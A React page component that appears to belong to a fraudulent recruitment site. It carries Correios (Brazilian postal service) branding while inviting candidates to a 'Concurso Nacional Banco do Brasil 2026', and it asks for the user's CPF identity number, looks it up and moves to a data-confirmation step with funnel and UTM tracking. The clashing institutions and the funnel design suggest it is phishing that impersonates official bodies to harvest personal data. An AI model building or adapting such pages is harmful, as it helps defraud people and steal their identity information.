import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { CPFInput } from "@/components/CPFInput";
import { validateCPF, unformatCPF, consultarCPF } from "@/lib/cpf";
import { Loader2, AlertTriangle } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";
import { getSession, saveSession, CepData } from "@/hooks/useSessionPersistence";

const Inscricao = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  
  const session = getSession();
  const cepData: CepData | undefined = location.state?.cepData || session?.cepData;

  useEffect(() => {
    trackFunnelEvent('inscricao-cpf');
    window.scrollTo(0, 0);
    if (cepData && session?.cpfData) {
      saveSession({ ...session, cpfData: session.cpfData, currentStep: '/inscricao', cepData });
    }
  }, []);

  const handleConsultar = async () => {
    setError("");
    const cpfNumbers = unformatCPF(cpf);
    if (cpfNumbers.length !== 11) { setError("Digite um CPF completo com 11 dígitos"); return; }
    if (!validateCPF(cpf)) { setError("CPF inválido. Verifique os números digitados."); return; }
    setLoading(true);
    try {
      const data = await consultarCPF(cpf);
      navigate(buildUrlWithUtm("/confirma-dados"), { state: { cpfData: data, cepData } });
    } catch (err) {
      const message = err instanceof Error ? err.message : "Erro ao consultar CPF";
      toast({ title: "Erro na consulta", description: message, variant: "destructive" });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Inscrição > CPF" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-md mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">VERIFICAÇÃO DO CANDIDATO</h1>
          <p className="text-sm text-muted-foreground">
            Para prosseguir com a inscrição no Concurso Nacional Banco do Brasil 2026 (Edital Nº 001/2026), informe o CPF do candidato. A verificação de elegibilidade é obrigatória conforme normas do edital.
          </p>

          <div className="border border-border rounded bg-card p-4 sm:p-5 space-y-4">
            <div className="space-y-2">
              <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">CPF do Candidato</label>
              <CPFInput value={cpf} onChange={setCpf} disabled={loading} error={!!error} />
              {error && (
                <div className="flex items-center gap-2 text-destructive text-xs bg-destructive/10 p-2.5 rounded">
                  <AlertTriangle className="w-4 h-4 shrink-0" />
                  <span>{error}</span>
                </div>
              )}
            </div>

            <Button
              onClick={handleConsultar}
              disabled={loading || unformatCPF(cpf).length < 11}
              className="w-full h-12 text-sm font-bold"
            >
              {loading ? (
                <><Loader2 className="w-5 h-5 animate-spin mr-2" />Verificando elegibilidade...</>
              ) : (
                "Verificar e Continuar"
              )}
            </Button>

            <p className="text-[10px] text-muted-foreground text-center">Dados protegidos conforme LGPD</p>
          </div>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Inscricao;
